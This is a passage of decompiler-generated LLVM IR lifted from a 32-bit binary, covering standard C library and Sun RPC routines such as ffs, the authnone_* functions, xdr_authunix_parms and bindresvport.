  %v6_806653638 = phi i32 [ %v6_806653633, %dec_label_pc_806653c.lr.ph ], [ %v6_8066536, %dec_label_pc_8066530 ]
  %v2_806653637 = phi i8 [ %v2_806653630, %dec_label_pc_806653c.lr.ph ], [ %v2_8066536, %dec_label_pc_8066530 ]
  %v0_806653536 = phi i32 [ %v4_806651d, %dec_label_pc_806653c.lr.ph ], [ %v1_8066535, %dec_label_pc_8066530 ]
  %v0_806654035 = phi i32 [ 0, %dec_label_pc_806653c.lr.ph ], [ %v1_8066534, %dec_label_pc_8066530 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_806652819 = load i8, i8* %v1_806652818, align 1
  %v3_806652820 = zext i8 %v2_806652819 to i32
  %v5_806652821 = and i32 %v4_8066528.pre, -256
  %v6_806652822 = or i32 %v3_806652820, %v5_806652821
  store i32 %v6_806652822, i32* @ecx, align 4
  %v4_806652a23 = icmp eq i8 %v2_806652819, 0
  %v1_806652c24 = icmp eq i1 %v4_806652a23, false
  br i1 %v1_806652c24, label %dec_label_pc_8066523, label %dec_label_pc_8066540

dec_label_pc_8066540:                             ; preds = %entry, %dec_label_pc_8066530, %dec_label_pc_806653c, %dec_label_pc_8066527
  %v0_806654017 = phi i32 [ %v0_806654035, %dec_label_pc_8066527 ], [ %v0_806654035, %dec_label_pc_806653c ], [ 0, %entry ], [ %v1_8066534, %dec_label_pc_8066530 ]
  ret i32 %v0_806654017

; uselistorder directives
  uselistorder i32 %v6_806652822, { 1, 0 }
  uselistorder i8 %v2_806652819, { 1, 2, 0 }
  uselistorder i32 %v1_8066535, { 1, 0 }
  uselistorder i32 %v6_8066528, { 1, 0 }
  uselistorder i8 %v2_8066528, { 1, 2, 0 }
  uselistorder i32 %v1_8066527, { 2, 1, 0 }
  uselistorder i8 %v2_806653630, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8066540, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_806653c, { 1, 0 }
}

define i32 @ffs(i16 %arg1) local_unnamed_addr {
entry:
  %v4_8066548 = sext i16 %arg1 to i32
  %v0_806654c = load i32, i32* @edx, align 4
  %v1_806654c = and i32 %v0_806654c, -256
  %v2_806654c = or i32 %v1_806654c, 1
  %v4_806654e = icmp eq i16 %arg1, 0
  %v1_8066551 = icmp eq i1 %v4_806654e, false
  br i1 %v1_8066551, label %dec_label_pc_8066558, label %dec_label_pc_8066553

dec_label_pc_8066553:                             ; preds = %entry
  %v2_8066553 = sdiv i32 %v4_8066548, 65536
  %v2_8066556 = or i32 %v1_806654c, 17
  br label %dec_label_pc_8066558

dec_label_pc_8066558:                             ; preds = %entry, %dec_label_pc_8066553
  %storemerge = phi i32 [ %v2_8066556, %dec_label_pc_8066553 ], [ %v2_806654c, %entry ]
  %v0_806655f = phi i32 [ %v2_8066556, %dec_label_pc_8066553 ], [ %v2_806654c, %entry ]
  %v0_806655c = phi i32 [ %v2_8066553, %dec_label_pc_8066553 ], [ %v4_8066548, %entry ]
  %v3_8066558 = trunc i32 %v0_806655c to i8
  %v4_8066558 = icmp eq i8 %v3_8066558, 0
  %v1_806655a = icmp eq i1 %v4_8066558, false
  br i1 %v1_806655a, label %dec_label_pc_8066562, label %dec_label_pc_806655c

dec_label_pc_806655c:                             ; preds = %dec_label_pc_8066558
  %v2_806655c = sdiv i32 %v0_806655c, 256
  %v1_806655f = add i32 %v0_806655f, 8
  br label %dec_label_pc_8066562

dec_label_pc_8066562:                             ; preds = %dec_label_pc_8066558, %dec_label_pc_806655c
  %storemerge10 = phi i32 [ %v1_806655f, %dec_label_pc_806655c ], [ %storemerge, %dec_label_pc_8066558 ]
  %v0_8066569 = phi i32 [ %v1_806655f, %dec_label_pc_806655c ], [ %v0_806655f, %dec_label_pc_8066558 ]
  %v0_8066566 = phi i32 [ %v2_806655c, %dec_label_pc_806655c ], [ %v0_806655c, %dec_label_pc_8066558 ]
  %v2_8066562 = urem i32 %v0_8066566, 16
  %v3_8066562 = icmp eq i32 %v2_8066562, 0
  %v1_8066564 = icmp eq i1 %v3_8066562, false
  br i1 %v1_8066564, label %dec_label_pc_806656c, label %dec_label_pc_8066566

dec_label_pc_8066566:                             ; preds = %dec_label_pc_8066562
  %v2_8066566 = sdiv i32 %v0_8066566, 16
  %v1_8066569 = add i32 %v0_8066569, 4
  br label %dec_label_pc_806656c

dec_label_pc_806656c:                             ; preds = %dec_label_pc_8066562, %dec_label_pc_8066566
  %storemerge11 = phi i32 [ %v1_8066569, %dec_label_pc_8066566 ], [ %storemerge10, %dec_label_pc_8066562 ]
  %v0_8066573 = phi i32 [ %v1_8066569, %dec_label_pc_8066566 ], [ %v0_8066569, %dec_label_pc_8066562 ]
  %v0_8066570 = phi i32 [ %v2_8066566, %dec_label_pc_8066566 ], [ %v0_8066566, %dec_label_pc_8066562 ]
  %v2_806656c = urem i32 %v0_8066570, 4
  %v3_806656c = icmp eq i32 %v2_806656c, 0
  %v1_806656e = icmp eq i1 %v3_806656c, false
  br i1 %v1_806656e, label %dec_label_pc_8066576, label %dec_label_pc_8066570

dec_label_pc_8066570:                             ; preds = %dec_label_pc_806656c
  %v2_8066570 = sdiv i32 %v0_8066570, 4
  %v1_8066573 = add i32 %v0_8066573, 2
  br label %dec_label_pc_8066576

dec_label_pc_8066576:                             ; preds = %dec_label_pc_806656c, %dec_label_pc_8066570
  %storemerge12 = phi i32 [ %v1_8066573, %dec_label_pc_8066570 ], [ %storemerge11, %dec_label_pc_806656c ]
  %v0_806657d = phi i32 [ %v1_8066573, %dec_label_pc_8066570 ], [ %v0_8066573, %dec_label_pc_806656c ]
  %v0_806657c = phi i32 [ %v2_8066570, %dec_label_pc_8066570 ], [ %v0_8066570, %dec_label_pc_806656c ]
  store i32 %storemerge12, i32* @edx, align 4
  store i32 0, i32* @ecx, align 4
  %v1_8066578 = icmp eq i32 %v0_806657c, 0
  br i1 %v1_8066578, label %dec_label_pc_8066586, label %dec_label_pc_806657c

dec_label_pc_806657c:                             ; preds = %dec_label_pc_8066576
  %v1_806657d = mul i32 %v0_806657d, 16777216
  %v2_806657d = sdiv i32 %v1_806657d, 16777216
  store i32 %v2_806657d, i32* @edx, align 4
  %v1_806657c = urem i32 %v0_806657c, 2
  %v1_8066580 = xor i32 %v1_806657c, 1
  %v2_8066583 = add nsw i32 %v1_8066580, %v2_806657d
  store i32 %v2_8066583, i32* @ecx, align 4
  br label %dec_label_pc_8066586

dec_label_pc_8066586:                             ; preds = %dec_label_pc_8066576, %dec_label_pc_806657c
  %v0_8066586 = phi i32 [ 0, %dec_label_pc_8066576 ], [ %v2_8066583, %dec_label_pc_806657c ]
  ret i32 %v0_8066586

; uselistorder directives
  uselistorder i32 %v2_806657d, { 1, 0 }
  uselistorder label %dec_label_pc_8066586, { 1, 0 }
  uselistorder label %dec_label_pc_8066576, { 1, 0 }
  uselistorder label %dec_label_pc_806656c, { 1, 0 }
  uselistorder label %dec_label_pc_8066562, { 1, 0 }
  uselistorder label %dec_label_pc_8066558, { 1, 0 }
}

define i32 @authnone_verf() local_unnamed_addr {
entry:
  %v0_806658c = load i32, i32* @eax, align 4
  ret i32 %v0_806658c
}

define i32 @authnone_validate() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @authnone_refresh() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @authnone_destroy() local_unnamed_addr {
entry:
  %v0_8066596 = load i32, i32* @eax, align 4
  ret i32 %v0_8066596
}

define i32 @authnone_marshal(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8066597 = load i32, i32* @ebx, align 4
  %v1_806659b = call i32 @__rpc_thread_variables(i32 %v0_8066597)
  %v1_80665a6 = add i32 %v1_806659b, 152
  %v2_80665a6 = inttoptr i32 %v1_80665a6 to i32*
  %v3_80665a6 = load i32, i32* %v2_80665a6, align 4
  %v1_80665ac = icmp eq i32 %v3_80665a6, 0
  br i1 %v1_80665ac, label %dec_label_pc_80665c4, label %dec_label_pc_80665b0

dec_label_pc_80665b0:                             ; preds = %entry
  %v1_80665b1 = add i32 %arg1, 4
  %v2_80665b1 = inttoptr i32 %v1_80665b1 to i32*
  %v3_80665b1 = load i32, i32* %v2_80665b1, align 4
  %v1_80665b7 = add i32 %v3_80665a6, 40
  %v5_80665bc = add i32 %v3_80665b1, 12
  %v6_80665bc = inttoptr i32 %v5_80665bc to i32*
  %v7_80665bc = load i32, i32* %v6_80665bc, align 4
  call void @__pseudo_call(i32 %v7_80665bc)
  br label %dec_label_pc_80665c4

dec_label_pc_80665c4:                             ; preds = %entry, %dec_label_pc_80665b0
  %v0_80665c4 = phi i32 [ 0, %entry ], [ %v1_80665b7, %dec_label_pc_80665b0 ]
  ret i32 %v0_80665c4

; uselistorder directives
  uselistorder label %dec_label_pc_80665c4, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %v0_80665cc = load i32, i32* @ebx, align 4
  %v1_80665d0 = call i32 @__rpc_thread_variables(i32 %v0_80665cc)
  store i32 %v1_80665d0, i32* %eax.global-to-local, align 4
  store i32 %v1_80665d0, i32* @ebx, align 4
  %v1_80665d7 = add i32 %v1_80665d0, 152
  %v2_80665d7 = inttoptr i32 %v1_80665d7 to i32*
  %v3_80665d7 = load i32, i32* %v2_80665d7, align 4
  store i32 %v3_80665d7, i32* @esi, align 4
  %v1_80665dd = icmp eq i32 %v3_80665d7, 0
  %v1_80665df = icmp eq i1 %v1_80665dd, false
  br i1 %v1_80665df, label %dec_label_pc_80665fd, label %dec_label_pc_80665e1

dec_label_pc_80665e1:                             ; preds = %entry
  %v3_80665e7 = call i32 @calloc(i64 1, i32 64)
  store i32 %v3_80665e7, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80665f3 = icmp eq i32 %v3_80665e7, 0
  br i1 %v1_80665f3, label %dec_label_pc_8066672, label %dec_label_pc_80665f7

dec_label_pc_80665f7:                             ; preds = %dec_label_pc_80665e1
  %v1_80665f7 = load i32, i32* @ebx, align 4
  %v2_80665f7 = add i32 %v1_80665f7, 152
  %v3_80665f7 = inttoptr i32 %v2_80665f7 to i32*
  store i32 %v3_80665e7, i32* %v3_80665f7, align 4
  %v0_80665fd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80665fd

dec_label_pc_80665fd:                             ; preds = %entry, %dec_label_pc_80665f7
  %v0_8066603 = phi i32 [ %v3_80665d7, %entry ], [ %v0_80665fd.pre, %dec_label_pc_80665f7 ]
  %v1_80665fd = add i32 %v0_8066603, 60
  %v2_80665fd = inttoptr i32 %v1_80665fd to i32*
  %v3_80665fd = load i32, i32* %v2_80665fd, align 4
  %v4_80665fd = icmp eq i32 %v3_80665fd, 0
  %v1_8066601 = icmp eq i1 %v4_80665fd, false
  br i1 %v1_8066601, label %dec_label_pc_80665fd.dec_label_pc_8066670_crit_edge, label %dec_label_pc_8066603

dec_label_pc_80665fd.dec_label_pc_8066670_crit_edge: ; preds = %dec_label_pc_80665fd
  br label %dec_label_pc_8066670

dec_label_pc_8066603:                             ; preds = %dec_label_pc_80665fd
  %v1_8066603 = add i32 %v0_8066603, 12
  store i32 %v1_8066603, i32* @ebx, align 4
  %v3_806660f = inttoptr i32 %v1_8066603 to i16*
  %v4_806660f = call i32 @memcpy(i16* %v3_806660f, i32 ptrtoint (i32* @global_var_807e520.853 to i32), i32 12)
  store i32 %v4_806660f, i32* %eax.global-to-local, align 4
  %v0_8066619 = load i32, i32* @ebx, align 4
  %v0_806661a = load i32, i32* @esi, align 4
  %v3_806661b = inttoptr i32 %v0_806661a to i16*
  %v4_806661b = call i32 @memcpy(i16* %v3_806661b, i32 %v0_8066619, i32 12)
  %v0_8066620 = load i32, i32* @esi, align 4
  %v1_8066620 = add i32 %v0_8066620, 40
  store i32 %v1_8066620, i32* %eax.global-to-local, align 4
  %v1_8066623 = add i32 %v0_8066620, 32
  %v2_8066623 = inttoptr i32 %v1_8066623 to i32*
  store i32 ptrtoint (i32* @global_var_806e764.898 to i32), i32* %v2_8066623, align 4
  %v0_806662e = load i32, i32* %eax.global-to-local, align 4
  %v2_806662f = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_806662f, i32* @edi, align 4
  %v5_8066634 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-36, i32 %v0_806662e, i32 20, i32 0)
  store i32 %v5_8066634, i32* %eax.global-to-local, align 4
  %v0_806663c = load i32, i32* @esi, align 4
  %v2_806663e = call i32 @xdr_opaque_auth(i32 %v2_806662f, i32 %v0_806663c)
  store i32 %v0_806663c, i32* %eax.global-to-local, align 4
  %v0_8066645 = load i32, i32* @ebx, align 4
  %v2_8066647 = call i32 @xdr_opaque_auth(i32 %v2_806662f, i32 %v0_8066645)
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v5_8066653 = add i32 %tmp, 16
  %v6_8066653 = inttoptr i32 %v5_8066653 to i32*
  %v7_8066653 = load i32, i32* %v6_8066653, align 4
  call void @__pseudo_call(i32 %v7_8066653)
  %v1_8066656 = load i32, i32* @esi, align 4
  %v2_8066656 = add i32 %v1_8066656, 60
  %v3_8066656 = inttoptr i32 %v2_8066656 to i32*
  store i32 %tmp, i32* %v3_8066656, align 4
  %v3_8066659 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_8066659, i32* %eax.global-to-local, align 4
  %v1_8066660 = add i32 %v3_8066659, 28
  %v2_8066660 = inttoptr i32 %v1_8066660 to i32*
  %v3_8066660 = load i32, i32* %v2_8066660, align 4
  store i32 %v3_8066660, i32* %eax.global-to-local, align 4
  %v1_8066663 = icmp eq i32 %v3_8066660, 0
  br i1 %v1_8066663, label %dec_label_pc_8066670, label %dec_label_pc_8066667

dec_label_pc_8066667:                             ; preds = %dec_label_pc_8066603
  call void @__pseudo_call(i32 %v3_8066660)
  br label %dec_label_pc_8066670

dec_label_pc_8066670:                             ; preds = %dec_label_pc_80665fd.dec_label_pc_8066670_crit_edge, %dec_label_pc_8066603, %dec_label_pc_8066667
  %v0_8066670 = load i32, i32* @esi, align 4
  store i32 %v0_8066670, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066672

dec_label_pc_8066672:                             ; preds = %dec_label_pc_80665e1, %dec_label_pc_8066670
  %v0_8066678 = phi i32 [ 0, %dec_label_pc_80665e1 ], [ %v0_8066670, %dec_label_pc_8066670 ]
  ret i32 %v0_8066678

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @xdr_opaque_auth, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_xdrmem_create, { 2, 1, 0, 3 }
  uselistorder i32 60, { 22, 23, 9, 20, 21, 6, 14, 24, 15, 11, 2, 16, 17, 3, 18, 19, 28, 26, 27, 25, 29, 30, 31, 12, 13, 0, 1, 7, 4, 8, 5, 10 }
  uselistorder i32 (i64, i32)* @calloc, { 4, 0, 5, 3, 1, 2 }
  uselistorder i32 64, { 7, 5, 6, 0, 31, 13, 14, 9, 15, 16, 1, 34, 35, 17, 18, 36, 19, 20, 21, 22, 42, 23, 37, 12, 24, 25, 26, 27, 28, 29, 30, 3, 10, 11, 2, 38, 39, 41, 40, 4, 32, 33, 8 }
  uselistorder i64 1, { 2, 3, 4, 0, 5, 6, 1 }
  uselistorder i32 152, { 4, 5, 1, 2, 0, 3, 6, 7 }
  uselistorder label %dec_label_pc_8066672, { 1, 0 }
  uselistorder label %dec_label_pc_8066670, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80665fd, { 1, 0 }
}

define i32 @__GI_xdr_authunix_parms(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_806667c = load i32, i32* @esi, align 4
  %v0_806667d = load i32, i32* @ebx, align 4
  store i32 %v0_806667d, i32* %stack_var_-8, align 4
  store i32 %tmp2, i32* @esi, align 4
  %v3_806668b = call i32 @xdr_u_long(i32* %arg1, i32 %arg2)
  %v1_8066693 = icmp eq i32 %v3_806668b, 0
  br i1 %v1_8066693, label %dec_label_pc_80666fa, label %dec_label_pc_8066697

dec_label_pc_8066697:                             ; preds = %entry
  %v0_8066698 = load i32, i32* @ebx, align 4
  %v1_8066698 = add i32 %v0_8066698, 4
  %v0_80666a1 = load i32, i32* @esi, align 4
  %v3_80666a2 = inttoptr i32 %v0_80666a1 to i32*
  %v4_80666a2 = call i32 @__GI_xdr_string(i32* %v3_80666a2, i32 %v1_8066698, i32 255)
  %v1_80666aa = icmp eq i32 %v4_80666a2, 0
  br i1 %v1_80666aa, label %dec_label_pc_80666fa, label %dec_label_pc_80666ae

dec_label_pc_80666ae:                             ; preds = %dec_label_pc_8066697
  %v0_80666b0 = load i32, i32* @ebx, align 4
  %v1_80666b0 = add i32 %v0_80666b0, 8
  store i32 %v1_80666b0, i32* @eax, align 4
  %v0_80666b4 = load i32, i32* @esi, align 4
  %v4_80666b5 = inttoptr i32 %v0_80666b4 to i32*
  %v5_80666b5 = call i32 @xdr_u_long(i32* %v4_80666b5, i32 %v1_80666b0)
  %v1_80666bd = icmp eq i32 %v5_80666b5, 0
  br i1 %v1_80666bd, label %dec_label_pc_80666fa, label %dec_label_pc_80666c1

dec_label_pc_80666c1:                             ; preds = %dec_label_pc_80666ae
  %v0_80666c3 = load i32, i32* @ebx, align 4
  %v1_80666c3 = add i32 %v0_80666c3, 12
  store i32 %v1_80666c3, i32* @eax, align 4
  %v0_80666c7 = load i32, i32* @esi, align 4
  %v4_80666c8 = inttoptr i32 %v0_80666c7 to i32*
  %v5_80666c8 = call i32 @xdr_u_long(i32* %v4_80666c8, i32 %v1_80666c3)
  %v1_80666d0 = icmp eq i32 %v5_80666c8, 0
  br i1 %v1_80666d0, label %dec_label_pc_80666fa, label %dec_label_pc_80666d4

dec_label_pc_80666d4:                             ; preds = %dec_label_pc_80666c1
  %v0_80666d4 = load i32, i32* @ebx, align 4
  %v1_80666d4 = add i32 %v0_80666d4, 16
  %v0_80666d7 = load i32, i32* @ecx, align 4
  %v1_80666e3 = add i32 %v0_80666d4, 20
  %v0_80666e7 = load i32, i32* @esi, align 4
  %v8_80666e8 = inttoptr i32 %v0_80666e7 to i32*
  %v9_80666e8 = call i32 @__GI_xdr_array(i32* %v8_80666e8, i32 %v1_80666e3, i32 %v1_80666d4, i32 16, i32 4, i32 134626863, i32 %v0_80666d7, i32 %v0_80666d7)
  %v1_80666f0 = icmp eq i32 %v9_80666e8, 0
  %v1_80666f2 = icmp eq i1 %v1_80666f0, false
  %v2_80666f2 = zext i1 %v1_80666f2 to i32
  br label %dec_label_pc_80666fc

dec_label_pc_80666fa:                             ; preds = %dec_label_pc_80666c1, %dec_label_pc_80666ae, %dec_label_pc_8066697, %entry
  br label %dec_label_pc_80666fc

dec_label_pc_80666fc:                             ; preds = %dec_label_pc_80666d4, %dec_label_pc_80666fa
  %storemerge = phi i32 [ %v2_80666f2, %dec_label_pc_80666d4 ], [ 0, %dec_label_pc_80666fa ]
  %v2_80666fd = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80666fd, i32* @ebx, align 4
  store i32 %v0_806667c, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 (i32*, i32, i32)* @__GI_xdr_string, { 1, 0 }
  uselistorder i32 255, { 0, 18, 28, 1, 2, 19, 20, 32, 13, 21, 22, 23, 24, 25, 26, 27, 3, 12, 29, 14, 4, 5, 15, 16, 6, 7, 8, 9, 10, 30, 11, 31, 17 }
  uselistorder label %dec_label_pc_80666fc, { 1, 0 }
}

define i32 @__GI_bindresvport(i32 %arg1, i16* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp9, i32* %stack_var_-32, align 4
  %v0_8066703 = load i32, i32* @ebx, align 4
  %v4_8066707 = ptrtoint i16* %arg2 to i32
  store i32 %v4_8066707, i32* @ebx, align 4
  %v1_806670f = icmp eq i16* %arg2, null
  %v1_8066711 = icmp eq i1 %v1_806670f, false
  br i1 %v1_8066711, label %dec_label_pc_806672e, label %dec_label_pc_8066713

dec_label_pc_8066713:                             ; preds = %entry
  %v2_8066718 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8066718, i32* @ebx, align 4
  %v4_806671d = bitcast i32* %stack_var_-32 to i8*
  %v5_806671d = call i32 @__GI_memset(i8* %v4_806671d, i32 0, i32 16)
  store i32 %v5_806671d, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8066744

dec_label_pc_806672e:                             ; preds = %entry
  %v2_806672e = load i16, i16* %arg2, align 2
  %v11_806672e = icmp eq i16 %v2_806672e, 2
  br i1 %v11_806672e, label %dec_label_pc_8066744, label %dec_label_pc_8066734

dec_label_pc_8066734:                             ; preds = %dec_label_pc_806672e
  %v1_8066734 = call i32 @__errno_location(i32 %v0_8066703)
  %v1_8066739 = inttoptr i32 %v1_8066734 to i32*
  store i32 96, i32* %v1_8066739, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80667c2

dec_label_pc_8066744:                             ; preds = %dec_label_pc_806672e, %dec_label_pc_8066713
  %v0_806674e = phi i32 [ %tmp9, %dec_label_pc_806672e ], [ 2, %dec_label_pc_8066713 ]
  %v0_8066744 = load i16, i16* @global_var_807ca48.899, align 8
  %v1_8066744 = icmp eq i16 %v0_8066744, 0
  %v1_806674c = icmp eq i1 %v1_8066744, false
  br i1 %v1_806674c, label %dec_label_pc_8066769, label %dec_label_pc_806674e

dec_label_pc_806674e:                             ; preds = %dec_label_pc_8066744
  %v1_806674e = call i32 @__libc_getpid(i32 %v0_806674e)
  %v2_806674e = sext i32 %v1_806674e to i64
  %v2_806675a = ashr i32 %v1_806674e, 31
  %v5_806675b = zext i32 %v2_806675a to i64
  %v6_806675b = mul nuw i64 %v5_806675b, 4294967296
  %v7_806675b = or i64 %v6_806675b, %v2_806674e
  %v9_806675b = sdiv i64 %v7_806675b, 424
  %v10_806675b = trunc i64 %v9_806675b to i32
  store i32 %v10_806675b, i32* %eax.global-to-local, align 4
  %v11_806675b = srem i64 %v7_806675b, 424
  %v1_806675d = trunc i64 %v11_806675b to i16
  %v2_806675d = add i16 %v1_806675d, 600
  store i16 %v2_806675d, i16* @global_var_807ca48.899, align 8
  %v0_8066769.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8066769

dec_label_pc_8066769:                             ; preds = %dec_label_pc_8066744, %dec_label_pc_806674e
  %v0_8066769 = phi i32 [ %v0_806674e, %dec_label_pc_8066744 ], [ %v0_8066769.pre, %dec_label_pc_806674e ]
  %v1_8066769 = call i32 @__errno_location(i32 %v0_8066769)
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v1_8066769, i32* %edi.global-to-local, align 4
  %v1_8066772 = inttoptr i32 %v1_8066769 to i32*
  store i32 98, i32* %v1_8066772, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80667b118 = load i32, i32* %esi.global-to-local, align 4
  %v1_80667b119 = add i32 %v0_80667b118, -423
  %v6_80667b121 = sub i32 422, %v0_80667b118
  %v7_80667b122 = and i32 %v6_80667b121, %v0_80667b118
  %v8_80667b123 = icmp slt i32 %v7_80667b122, 0
  %v9_80667b124 = icmp eq i32 %v1_80667b119, 0
  %v10_80667b125 = icmp slt i32 %v1_80667b119, 0
  %v3_80667b726 = icmp eq i1 %v10_80667b125, %v8_80667b123
  %v4_80667b727 = icmp eq i1 %v9_80667b124, false
  %v5_80667b728 = and i1 %v4_80667b727, %v3_80667b726
  br i1 %v5_80667b728, label %dec_label_pc_80667c2, label %dec_label_pc_80667b9

dec_label_pc_806677d:                             ; preds = %dec_label_pc_80667bd
  %v0_806677d = load i16, i16* @global_var_807ca48.899, align 8
  %v1_806677d = zext i16 %v0_806677d to i32
  %v3_806677d = and i32 %v2_806677d29, -65536
  %v4_806677d = or i32 %v1_806677d, %v3_806677d
  %v1_8066785 = add i32 %v4_806677d, 1
  store i32 %v1_8066785, i32* %eax.global-to-local, align 4
  %v2_8066786 = call i16 @llvm.bswap.i16(i16 %v0_806677d)
  %v1_806678a = trunc i32 %v1_8066785 to i16
  %v2_806678e = load i32, i32* @ebx, align 4
  %v3_806678e = add i32 %v2_806678e, 2
  %v4_806678e = inttoptr i32 %v3_806678e to i16*
  store i16 %v2_8066786, i16* %v4_806678e, align 2
  %v0_8066792 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066792 = trunc i32 %v0_8066792 to i16
  %v7_8066798 = icmp sgt i16 %v1_806678a, 1023
  %.v1_8066792 = select i1 %v7_8066798, i16 600, i16 %v1_8066792
  store i16 %.v1_8066792, i16* @global_var_807ca48.899, align 8
  %v0_80667a6 = load i32, i32* @ebx, align 4
  %v0_80667a8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80667a8 = add i32 %v0_80667a8, 1
  store i32 %v1_80667a8, i32* %esi.global-to-local, align 4
  %v4_80667a9 = call i32 @bind(i32 %v0_80667a6, i32 16, i32 %v0_8066792)
  store i32 %v4_80667a9, i32* %eax.global-to-local, align 4
  %v1_80667b1 = add i32 %v0_80667a8, -422
  %v6_80667b1 = sub i32 421, %v0_80667a8
  %v7_80667b1 = and i32 %v6_80667b1, %v1_80667a8
  %v8_80667b1 = icmp slt i32 %v7_80667b1, 0
  %v9_80667b1 = icmp eq i32 %v1_80667b1, 0
  %v10_80667b1 = icmp slt i32 %v1_80667b1, 0
  %v3_80667b7 = icmp eq i1 %v10_80667b1, %v8_80667b1
  %v4_80667b7 = icmp eq i1 %v9_80667b1, false
  %v5_80667b7 = and i1 %v4_80667b7, %v3_80667b7
  br i1 %v5_80667b7, label %dec_label_pc_80667c2, label %dec_label_pc_80667b9

dec_label_pc_80667b9:                             ; preds = %dec_label_pc_8066769, %dec_label_pc_806677d
  %v2_806677d29 = phi i32 [ %v4_80667a9, %dec_label_pc_806677d ], [ -1, %dec_label_pc_8066769 ]
  %v2_80667b9 = icmp slt i32 %v2_806677d29, 0
  %v1_80667bb = icmp eq i1 %v2_80667b9, false
  br i1 %v1_80667bb, label %dec_label_pc_80667c2, label %dec_label_pc_80667bd

dec_label_pc_80667bd:                             ; preds = %dec_label_pc_80667b9
  %v0_80667bd = load i32, i32* %edi.global-to-local, align 4
  %v1_80667bd = inttoptr i32 %v0_80667bd to i32*
  %v2_80667bd = load i32, i32* %v1_80667bd, align 4
  %v11_80667bd = icmp eq i32 %v2_80667bd, 98
  br i1 %v11_80667bd, label %dec_label_pc_806677d, label %dec_label_pc_80667c2

dec_label_pc_80667c2:                             ; preds = %dec_label_pc_8066769, %dec_label_pc_806677d, %dec_label_pc_80667b9, %dec_label_pc_80667bd, %dec_label_pc_8066734
  %v0_80667c9 = phi i32 [ -1, %dec_label_pc_8066734 ], [ -1, %dec_label_pc_8066769 ], [ %v4_80667a9, %dec_label_pc_806677d ], [ %v2_806677d29, %dec_label_pc_80667b9 ], [ %v2_806677d29, %dec_label_pc_80667bd ]
  store i32 %v0_8066703, i32* @ebx, align 4
  ret i32 %v0_80667c9

; uselistorder directives
  uselistorder i32 %v1_80667b1, { 1, 0 }
  uselistorder i32 %v1_8066769, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 0, 3, 1, 4, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @bind, { 0, 4, 3, 2, 1 }
  uselistorder i32 -65536, { 23, 5, 6, 3, 24, 25, 26, 7, 8, 9, 2, 1, 10, 11, 4, 12, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 98, { 0, 2, 1 }
  uselistorder i64 424, { 1, 0 }
  uselistorder i32 31, { 47, 50, 51, 0, 1, 44, 45, 25, 23, 52, 53, 21, 4, 5, 2, 3, 12, 46, 26, 27, 28, 8, 9, 6, 7, 22, 29, 24, 54, 55, 48, 49, 13, 14, 15, 30, 31, 32, 33, 34, 35, 36, 37, 38, 10, 39, 16, 40, 41, 17, 42, 18, 11, 43, 19, 20 }
  uselistorder i32 (i32)* @__libc_getpid, { 1, 5, 2, 12, 11, 10, 9, 8, 4, 3, 7, 6, 0 }
  uselistorder i16* @global_var_807ca48.899, { 3, 2, 1, 0 }
  uselistorder i32 96, { 6, 3, 4, 7, 0, 1, 2, 5 }
  uselistorder i16* null, { 2, 0, 3, 1 }
  uselistorder i16* %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80667c2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_80667b9, { 1, 0 }
  uselistorder label %dec_label_pc_8066769, { 1, 0 }
}

define i32 @__get_myaddress(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i16 @__decompiler_undefined_function_2()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4152 = alloca i32, align 4
  %stack_var_-4188 = alloca i8*, align 4
